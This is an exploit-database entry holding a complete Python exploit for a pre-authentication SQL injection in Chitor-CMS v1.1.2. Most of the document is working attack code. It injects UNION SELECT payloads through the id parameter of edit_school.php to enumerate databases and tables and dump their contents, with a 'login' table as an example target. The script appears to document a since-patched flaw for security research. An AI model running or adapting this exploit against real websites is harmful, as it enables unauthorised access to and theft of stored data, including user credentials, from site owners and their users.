@@ -1,0 +1,172 @@
+id: 38612
+date: 04/20/2023
+title: Chitor-CMS v1.1.2 - Pre-Auth SQL Injection Exploit
+author: msd0pe
+cves: 
+
+#!/usr/bin/python3
+
+#######################################################
+#                                                     # 
+#  Exploit Title: Chitor-CMS v1.1.2 - Pre-Auth SQL Injection          #
+#  Date: 2023/04/13               #
+#  ExploitAuthor: msd0pe                                  #
+#  Project: https://github.com/waqaskanju/Chitor-CMS  #
+#  My Github: https://github.com/msd0pe-1             #
+#  Patched the 2023/04/16: 69d3442 commit             #
+#                                                     #
+#######################################################
+
+__description__ = 'Chitor-CMS < 1.1.2 Pre-Auth SQL Injection.'
+__author__ = 'msd0pe'
+__version__ = '1.1'
+__date__ = '2023/04/13'
+
+class bcolors:
+    PURPLE = '\033[95m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    OCRA = '\033[93m'
+    RED = '\033[91m'
+    CYAN = '\033[96m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+class infos:
+    INFO = "[" + bcolors.OCRA + bcolors.BOLD + "?" + bcolors.ENDC + bcolors.ENDC + "] "
+    ERROR = "[" + bcolors.RED + bcolors.BOLD + "X" + bcolors.ENDC + bcolors.ENDC + "] "
+    GOOD = "[" + bcolors.GREEN + bcolors.BOLD + "+" + bcolors.ENDC + bcolors.ENDC + "] "
+    PROCESS = "[" + bcolors.BLUE + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.ENDC + "] "
+
+import re
+import requests
+import optparse
+from prettytable import PrettyTable
+
+def DumpTable(url, database, table):
+    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
+    x = PrettyTable()
+    columns = []
+    payload = "/edit_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON_ARRAYAGG(CONCAT_WS(0x787a6d64706c%2Ccolumn_name))%2C0x716a6b6271) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=\"" + table + "\" AND table_schema=\"" + database + "\"-- -"
+    u = requests.get(url + payload, headers=header)
+    try:
+        r = re.findall("qpzkq\[(.*?)\]qjkbq",u.text)
+        r = r[0].replace('\"',"").split(',')
+        if r == []:
+            pass
+        else:
+            for i in r:
+                columns.append(i)
+                pass
+    except:
+        pass
+    x.field_names = columns
+    payload = "/edit_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON_ARRAYAGG(CONCAT_WS(0x787a6d64706c%2C " + str(columns).replace("[","").replace("]","").replace("\'","").replace(" ","") + "))%2C0x716a6b6271) FROM " + database + "." + table + "-- -"
+    u = requests.get(url + payload, headers=header)
+    try:
+        r = re.findall("qpzkq\[(.*?)\]qjkbq",u.text)
+        r = r[0].replace('\"',"").split(',')
+        if r == []:
+            pass
+        else:
+            for i in r:
+                i = i.split("xzmdpl")
+                x.add_rows([i])
+    except ValueError:
+        r = re.findall("qpzkq\[(.*?)\]qjkbq",u.text)
+        r = r[0].replace('\"',"").split(',')
+        if r == []:
+            pass
+        else:
+            for i in r:
+                i = i.split("xzmdpl")
+                i.append("")
+                x.add_rows([i])        
+    print(x)
+
+def ListTables(url, database):
+    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
+    x = PrettyTable()
+    x.field_names = ["TABLES"]
+    payload = "/edit_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON_ARRAYAGG(CONCAT_WS(0x787a6d64706c%2Ctable_name))%2C0x716a6b6271) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x" + str(database).encode('utf-8').hex() + ")-- -"
+    u = requests.get(url + payload, headers=header)
+    try:
+        r = re.findall("qpzkq\[(.*?)\]qjkbq",u.text)
+        r = r[0].replace('\"',"").split(',')
+        if r == []:
+            pass
+        else:
+            for i in r:
+                x.add_row([i])
+    except:
+        pass
+    print(x)
+
+def ListDatabases(url):
+    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
+    x = PrettyTable()
+    x.field_names = ["DATABASES"]
+    payload = "/edit_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON_ARRAYAGG(CONCAT_WS(0x787a6d64706c%2Cschema_name))%2C0x716a6b6271) FROM INFORMATION_SCHEMA.SCHEMATA-- -"
+    u = requests.get(url + payload, headers=header)
+    try:
+        r = re.findall("qpzkq\[(.*?)\]qjkbq",u.text)
+        r = r[0].replace('\"',"").split(',')
+        if r == []:
+            pass
+        else:
+            for i in r:
+                x.add_row([i])
+    except:
+        pass
+    print(x)
+
+def Main():
+    Menu = optparse.OptionParser(usage='python %prog [options]', version='%prog ' + __version__)
+    Menu.add_option('-u', '--url', type="str", dest="url", help='target url')
+    Menu.add_option('--dbs', action="store_true", dest="l_databases", help='list databases')
+    Menu.add_option('-D', '--db', type="str", dest="database", help='select a database')
+    Menu.add_option('--tables', action="store_true", dest="l_tables", help='list tables')
+    Menu.add_option('-T', '--table', type="str", dest="table", help='select a table')
+    Menu.add_option('--dump', action="store_true", dest="dump", help='dump the content')
+    (options, args) = Menu.parse_args()
+
+    Examples = optparse.OptionGroup(Menu, "Examples", """python3 chitor1.1.py -u http://127.0.0.1 --dbs
+                                                         python3 chitor1.1.py -u http://127.0.0.1 -D chitor_db --tables
+                                                         python3 chitor1.1.py -u http://127.0.0.1 -D chitor_db -T login --dump
+    """)
+    Menu.add_option_group(Examples)
+
+    if len(args) != 0 or options == {'url': None, 'l_databases': None, 'database': None, 'l_tables': None, 'table': None, 'dump': None}:
+        Menu.print_help()
+        print('')
+        print('  %s' % __description__)
+        print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
+        print('  Any malicious or illegal activity may be punishable by law')
+        print('  Use at your own risk')
+
+    elif len(args) == 0:
+        try:
+            if options.url != None:
+                if options.l_databases != None:
+                    ListDatabases(options.url)
+                if options.database != None:
+                    if options.l_tables != None:
+                        ListTables(options.url, options.database)
+                    if options.table != None:
+                        if options.dump != None:
+                            DumpTable(options.url, options.database, options.table)
+        except:
+            print("Unexpected error")
+
+if __name__ == '__main__':
+    try:
+        Main()
+
+    except KeyboardInterrupt:
+        print()
+        print(infos.PROCESS + "Exiting...")
+        print()
+        exit(1)
+
+#  0day.today [2023-04-24]  #
